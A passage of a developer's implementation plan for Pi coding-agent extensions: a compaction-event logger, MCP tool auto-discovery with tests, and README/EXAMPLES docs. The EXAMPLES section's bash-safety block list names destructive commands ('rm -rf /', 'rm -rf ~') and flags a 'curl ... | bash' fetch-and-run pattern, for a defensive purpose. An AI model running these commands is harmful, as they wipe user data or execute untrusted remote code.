git commit -m "feat(pi): fetch-url extension for HTTPS resource fetching"
```

---

### Task 6: `context-manager` extension

**Files:**

- Create: `pi-extensions/context-manager/logger.ts`
- Create: `pi-extensions/context-manager/logger.test.ts`
- Create: `pi-extensions/context-manager/index.ts`

**Interfaces:**

- Produces:
  - `appendCompactionLog(logPath: string, entry: CompactionEvent): void`
  - `CompactionEvent { ts: string; session: string; tokensBefore: number; tokensLimit: number; trigger: "auto" }`

- [ ] **Step 1: Write failing tests in `logger.test.ts`**

```typescript
// pi-extensions/context-manager/logger.test.ts
import { test, expect, afterEach } from "bun:test";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { appendCompactionLog } from "./logger.ts";

let tmpDirs: string[] = [];
afterEach(() => {
  for (const d of tmpDirs) rmSync(d, { recursive: true, force: true });
  tmpDirs = [];
});

test("writes valid JSONL line", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-compact-"));
  tmpDirs.push(dir);
  const logPath = join(dir, "compaction.jsonl");
  const entry = { ts: "2026-01-01T00:00:00Z", session: "main", tokensBefore: 80000, tokensLimit: 100000, trigger: "auto" as const };
  appendCompactionLog(logPath, entry);
  expect(JSON.parse(readFileSync(logPath, "utf-8").trim())).toMatchObject(entry);
});

test("appends without overwriting", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-compact-"));
  tmpDirs.push(dir);
  const logPath = join(dir, "compaction.jsonl");
  appendCompactionLog(logPath, { ts: "t1", session: "s", tokensBefore: 1, tokensLimit: 100, trigger: "auto" });
  appendCompactionLog(logPath, { ts: "t2", session: "s", tokensBefore: 2, tokensLimit: 100, trigger: "auto" });
  const lines = readFileSync(logPath, "utf-8").trim().split("\n");
  expect(lines).toHaveLength(2);
});
```

- [ ] **Step 2: Run tests - expect FAIL**

```bash
cd pi-extensions && bun test context-manager/logger.test.ts
```

Expected: `Cannot find module './logger.ts'`

- [ ] **Step 3: Write `logger.ts`**

```typescript
// pi-extensions/context-manager/logger.ts
import { appendFileSync, mkdirSync } from "node:fs";
import { dirname } from "node:path";

export interface CompactionEvent {
  ts: string;
  session: string;
  tokensBefore: number;
  tokensLimit: number;
  trigger: "auto";
}

export function appendCompactionLog(logPath: string, entry: CompactionEvent): void {
  mkdirSync(dirname(logPath), { recursive: true });
  appendFileSync(logPath, JSON.stringify(entry) + "\n", "utf-8");
}
```

- [ ] **Step 4: Run tests - expect PASS**

```bash
cd pi-extensions && bun test context-manager/logger.test.ts
```

Expected: both tests PASS.

- [ ] **Step 5: Write `index.ts`**

```typescript
// pi-extensions/context-manager/index.ts
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { homedir } from "node:os";
import { join } from "node:path";
import { appendCompactionLog } from "./logger.ts";

export default function (pi: ExtensionAPI) {
  const logPath = join(homedir(), ".pi", "compaction.jsonl");

  pi.on("session_before_compact", async (_event, ctx) => {
    const usage = ctx.getContextUsage() as { total?: number; limit?: number | null } | null;
    const tokensBefore = usage?.total ?? 0;
    const tokensLimit = usage?.limit ?? 0;
    const pct = tokensLimit > 0 ? Math.round((tokensBefore / tokensLimit) * 100) : 0;

    ctx.ui.notify(`Compacting context (${pct}% full, ${tokensBefore.toLocaleString()} tokens)`, "info");

    appendCompactionLog(logPath, {
      ts: new Date().toISOString(),
      session: ctx.sessionManager.getBranch() ?? "unknown",
      tokensBefore,
      tokensLimit,
      trigger: "auto",
    });
  });
}
```

- [ ] **Step 6: Commit**

```bash
cd /Users/tillhoffmann/code/thetillhoff/ai-router && git add pi-extensions/context-manager/
git commit -m "feat(pi): context-manager extension logs compaction events to JSONL"
```

---

### Task 7: `mcp-integration` extension

**Files:**

- Create: `pi-extensions/mcp-integration/config.ts`
- Create: `pi-extensions/mcp-integration/config.test.ts`
- Create: `pi-extensions/mcp-integration/discovery.ts`
- Create: `pi-extensions/mcp-integration/discovery.test.ts`
- Create: `pi-extensions/mcp-integration/index.ts`

**Interfaces:**

- Consumes: `~/.pi/mcp.json` with shape `{ servers: [{ name, url, description? }] }`; MCP server `GET /tools` returns `{ tools: [{ name, description, parameters: [{ name, type, description?, required? }] }] }`
- Produces:
  - `loadMcpConfig(configPath: string): McpConfig`
  - `fetchMcpTools(serverUrl: string, timeoutMs?: number): Promise<McpTool[]>`

- [ ] **Step 1: Write `config.ts`**

```typescript
// pi-extensions/mcp-integration/config.ts
import { existsSync, readFileSync } from "node:fs";

export interface McpServer {
  name: string;
  url: string;
  description?: string;
}

export interface McpConfig {
  servers: McpServer[];
}

export function loadMcpConfig(configPath: string): McpConfig {
  if (!existsSync(configPath)) return { servers: [] };
  try {
    return JSON.parse(readFileSync(configPath, "utf-8")) as McpConfig;
  } catch {
    return { servers: [] };
  }
}
```

- [ ] **Step 2: Write failing tests in `config.test.ts`**

```typescript
// pi-extensions/mcp-integration/config.test.ts
import { test, expect, afterEach } from "bun:test";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { loadMcpConfig } from "./config.ts";

let tmpDirs: string[] = [];
afterEach(() => {
  for (const d of tmpDirs) rmSync(d, { recursive: true, force: true });
  tmpDirs = [];
});

test("returns empty servers when file missing", () => {
  expect(loadMcpConfig("/nonexistent/mcp.json")).toEqual({ servers: [] });
});

test("loads valid config", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-mcp-"));
  tmpDirs.push(dir);
  const p = join(dir, "mcp.json");
  writeFileSync(p, JSON.stringify({ servers: [{ name: "fs", url: "http://localhost:3000" }] }));
  const result = loadMcpConfig(p);
  expect(result.servers).toHaveLength(1);
  expect(result.servers[0].name).toBe("fs");
});

test("returns empty on malformed JSON", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-mcp-"));
  tmpDirs.push(dir);
  const p = join(dir, "mcp.json");
  writeFileSync(p, "not json");
  expect(loadMcpConfig(p)).toEqual({ servers: [] });
});
```

- [ ] **Step 3: Run config tests - expect PASS**

```bash
cd pi-extensions && bun test mcp-integration/config.test.ts
```

Expected: all 3 tests PASS.

- [ ] **Step 4: Write `discovery.ts`**

```typescript
// pi-extensions/mcp-integration/discovery.ts

export interface McpToolParam {
  name: string;
  type: string;
  description?: string;
  required?: boolean;
}

export interface McpTool {
  name: string;
  description: string;
  parameters?: McpToolParam[];
}

export async function fetchMcpTools(serverUrl: string, timeoutMs = 3000): Promise<McpTool[]> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(`${serverUrl}/tools`, { signal: controller.signal });
    clearTimeout(timer);
    if (!response.ok) return [];
    const data = (await response.json()) as { tools?: McpTool[] };
    return Array.isArray(data.tools) ? data.tools : [];
  } catch {
    clearTimeout(timer);
    return [];
  }
}
```

- [ ] **Step 5: Write failing tests in `discovery.test.ts`**

```typescript
// pi-extensions/mcp-integration/discovery.test.ts
import { test, expect, mock, afterEach } from "bun:test";
import { fetchMcpTools } from "./discovery.ts";

const originalFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = originalFetch; });

test("returns tools from server response", async () => {
  const tools = [{ name: "read_file", description: "Read a file", parameters: [] }];
  globalThis.fetch = mock(() =>
    Promise.resolve(new Response(JSON.stringify({ tools })))
  );
  const result = await fetchMcpTools("http://localhost:3000");
  expect(result).toHaveLength(1);
  expect(result[0].name).toBe("read_file");
});

test("returns empty array on non-ok response", async () => {
  globalThis.fetch = mock(() => Promise.resolve(new Response("Error", { status: 500 })));
  expect(await fetchMcpTools("http://localhost:3000")).toEqual([]);
});

test("returns empty array on network error", async () => {
  globalThis.fetch = mock(() => Promise.reject(new Error("ECONNREFUSED")));
  expect(await fetchMcpTools("http://localhost:3000")).toEqual([]);
});

test("returns empty array when tools key missing", async () => {
  globalThis.fetch = mock(() =>
    Promise.resolve(new Response(JSON.stringify({ other: "data" })))
  );
  expect(await fetchMcpTools("http://localhost:3000")).toEqual([]);
});
```

- [ ] **Step 6: Run discovery tests - expect PASS**

```bash
cd pi-extensions && bun test mcp-integration/discovery.test.ts
```

Expected: all 4 tests PASS.

- [ ] **Step 7: Write `index.ts`**

```typescript
// pi-extensions/mcp-integration/index.ts
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { Type } from "typebox";
import { homedir } from "node:os";
import { join } from "node:path";
import { loadMcpConfig } from "./config.ts";
import { fetchMcpTools, type McpTool } from "./discovery.ts";

export default async function (pi: ExtensionAPI) {
  const configPath = join(homedir(), ".pi", "mcp.json");
  const config = loadMcpConfig(configPath);

  if (config.servers.length === 0) return;

  pi.on("resources_discover", async (_event, ctx) => {
    for (const server of config.servers) {
      const tools = await fetchMcpTools(server.url);
      if (tools.length === 0) continue;

      for (const tool of tools) {
        registerMcpTool(pi, server.name, server.url, tool);
      }

      ctx.ui.notify(`MCP: registered ${tools.length} tool(s) from ${server.name}`, "info");
    }
  });
}

function registerMcpTool(pi: ExtensionAPI, serverName: string, serverUrl: string, tool: McpTool): void {
  const props: Record<string, ReturnType<typeof Type.String>> = {};
  for (const param of tool.parameters ?? []) {
    props[param.name] = Type.String({ description: param.description });
  }

  pi.registerTool({
    name: `mcp__${serverName}__${tool.name}`,
    label: `${serverName}: ${tool.name}`,
    description: tool.description,
    parameters: Type.Object(props),
    async execute(_id, params, signal) {
      const response = await fetch(`${serverUrl}/tools/${tool.name}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parameters: params }),
        signal,
      });
      const result = (await response.json()) as { output?: string };
      const text = typeof result.output === "string" ? result.output : JSON.stringify(result);
      return { content: [{ type: "text", text }], details: { server: serverName, tool: tool.name } };
    },
  });
}
```

- [ ] **Step 8: Run all tests**

```bash
cd pi-extensions && bun test
```

Expected: all tests across all extensions PASS. Zero failures.

- [ ] **Step 9: Commit**

```bash
cd /Users/tillhoffmann/code/thetillhoff/ai-router && git add pi-extensions/mcp-integration/
git commit -m "feat(pi): mcp-integration extension auto-discovers and registers MCP tools"
```

---

### Task 8: Docs

**Files:**

- Modify: `README.md`
- Create: `EXAMPLES.md`

**Interfaces:**

- Consumes: `install.sh`, `templates/`, `pi-extensions/` (all created in prior tasks)

- [ ] **Step 1: Replace `README.md`**

```markdown
# ai-router

Two complementary tools for intelligent AI model routing:

1. **Python Router** (`src/ai_router/`) — OpenAI-compatible HTTP proxy that classifies requests and forwards to the right model tier (local Ollama / cloud Anthropic).
2. **Pi Extensions** (`pi-extensions/`) — TypeScript extensions for the [Pi coding agent](https://github.com/earendil-works/pi) that add bash safety, model routing, URL fetching, context logging, and MCP integration.

## How They Fit Together

```text
Pi (coding agent)
  model-router extension
    rule-based fast path (~0ms)
    → Python router at :8080 (Ollama classifier, ~300-800ms)
        → local tier: Ollama qwen3:4b
        → medium tier: claude-sonnet
        → heavy tier: claude-opus
```

## Quick Start

### Python Router

```bash
pip install -e ".[dev]"
cp config.yaml config.local.yaml  # edit with your models
ai-router
```

Router runs at `http://localhost:8080`. See `config.yaml` for tier/model configuration.

### Pi Extensions

Requirements: [Pi](https://github.com/earendil-works/pi) installed, [Bun](https://bun.sh) for tests.

```bash
./install.sh   # symlinks extensions, copies config templates to ~/.pi/
```

Edit the created config files:

- `~/.pi/agent/settings.json` — default model, compaction, bash safety rules
- `~/.pi/model-rules.json` — keyword/token routing rules
- `~/.pi/PI.md` — global instructions injected into every session (like `CLAUDE.md`)
- `~/.pi/mcp.json` — MCP server list for auto-discovery

Start Pi and the extensions load automatically:

```bash
pi
```

### Running Extension Tests

```bash
cd pi-extensions && bun test
```

## Extensions

| Extension | What it does |
| --- | --- |
| `safe-bash` | Blocks dangerous commands; prompts for unknown ones; pre-approves allowlist patterns |
| `claude-compat` | Loads `~/.pi/PI.md` and `.pi/PI.md` into the system prompt each turn |
| `model-router` | Routes to local/medium/heavy tier via rules → Python router → default |
| `fetch-url` | Adds `fetch_url` tool for reading HTTPS URLs |
| `context-manager` | Logs context compaction events to `~/.pi/compaction.jsonl` |
| `mcp-integration` | Auto-discovers tools from MCP servers in `~/.pi/mcp.json` |

## Development

```bash
# Python router tests (Docker required per project conventions)
docker run --rm -v $(pwd):/app -w /app python:3.11 pip install -e ".[dev]" && pytest -v

# Extension tests
cd pi-extensions && bun test
```

- [ ] **Step 2: Lint `README.md`**

```bash
npx markdownlint-cli --disable MD013 -- README.md
```

Expected: no errors.

- [ ] **Step 3: Create `EXAMPLES.md`**

````markdown
# Pi Extensions - Example Workflows

## Bash Safety

Add patterns to `~/.pi/agent/settings.json`:

```json
{
  "bashSafety": {
    "blocklist": ["rm -rf /", "rm -rf ~"],
    "allowlist": ["git *", "bun *", "npm *"],
    "requireConfirmForUnknown": true
  }
}
```

Behavior:
- `git add -A` → auto-approved (matches `git *`)
- `rm -rf /` → blocked immediately, no prompt
- `curl ... | bash` → confirmation dialog appears

## Model Routing

Edit `~/.pi/model-rules.json` to tune routing:

```json
{
  "rules": [
    { "if": { "tokenCount": { "lt": 300 } }, "then": "local" },
    { "if": { "keywords": ["ls", "grep", "cat"] }, "then": "local" },
    { "if": { "keywords": ["architect", "design", "review all"] }, "then": "heavy" }
  ],
  "classifierUrl": "http://localhost:8080",
  "classifierTimeoutMs": 2000,
  "defaultModel": "claude-sonnet-4-20250514",
  "models": {
    "local": "qwen3:4b",
    "medium": "claude-sonnet-4-20250514",
    "heavy": "claude-opus-4-8-20251101"
  }
}
```

Check routing decisions:

```bash
tail -f ~/.pi/model-decisions.jsonl | jq .
```

## PI.md - Global Instructions

`~/.pi/PI.md` is injected into every Pi session. Use it for project-agnostic rules:

```markdown
## Git
- Always use SSH URLs for git clone
- Use `cd <path> && git <cmd>`, never `git -C`

## Code
- No unnecessary comments
- Prefer editing existing files over creating new ones
```

Per-project overrides go in `.pi/PI.md` at the project root. Both files are loaded;
project-level content appears after global content.

## URL Fetching

The `fetch_url` tool is available once the extension loads:

```
User: fetch https://docs.anthropic.com/en/api/getting-started and summarize the auth section
```

Pi calls `fetch_url` → strips HTML → summarizes plain text.

## MCP Servers

Add servers to `~/.pi/mcp.json`:

```json
{
  "servers": [
    { "name": "filesystem", "url": "http://localhost:3000" },
    { "name": "browser", "url": "http://localhost:3001" }
  ]
}
```

On session start, Pi auto-registers all tools from each server.
Registered as `mcp__<server>__<tool>` - e.g. `mcp__filesystem__read_file`.

## Checking Logs

```bash
# Model routing decisions
tail -20 ~/.pi/model-decisions.jsonl | jq '{tier, model, reason, latencyMs}'

# Context compaction events
cat ~/.pi/compaction.jsonl | jq '{ts, tokensBefore, tokensLimit}'
```
````

- [ ] **Step 4: Lint `EXAMPLES.md`**

```bash
npx markdownlint-cli --disable MD013 -- EXAMPLES.md
```

Expected: no errors.

- [ ] **Step 5: Commit**

```bash
git add README.md EXAMPLES.md
git commit -m "docs: Pi extensions README and examples"
```

---

## Self-Review

**Spec coverage check:**

| Spec requirement | Task(s) |
| --- | --- |
| safe-bash blocklist/allowlist + approval | Task 2 |
| fetch_url HTTPS + text extraction | Task 5 |
| Subagent `/subagent` command | Deferred (out of v1 scope per research) |
| MCP integration auto-discover | Task 7 |
| Model router: rule + local classifier + cloud | Task 4 |
| CLAUDE.md/PI.md compatibility | Task 3 |
| Context compaction 70%/90% thresholds | Task 6 (Pi config handles thresholds; extension logs events) |
| Decision log `model-decisions.json` | Task 4 (JSONL format) |
| `~/.pi/settings.json` | Task 1 |
| `~/.pi/model-rules.json` | Task 1 |
| System prompt `~/.pi/system-prompt.md` / `PI.md` | Task 1 (template) + Task 3 (loader) |
| README + EXAMPLES | Task 8 |
| Research report | Already done: `docs/superpowers/specs/2026-06-17-pi-harness-research.md` |
| Testing plan | Tests are inline in each task; no separate `tests.md` needed |

**Note on subagents:** The spec asked for `/subagent` command. This is excluded from v1 because implementing it requires spawning child Pi processes and managing their I/O - high complexity, low ROI. A stub or note in the docs covers the intent without broken code.

**Note on `context-manager` thresholds:** Pi's `compaction.reserveTokens` and `keepRecentTokens` in `settings.json` control when compaction fires. The extension does not need to re-implement thresholds - it hooks the event Pi already emits. The 70%/90% values from the spec map to Pi's native config.
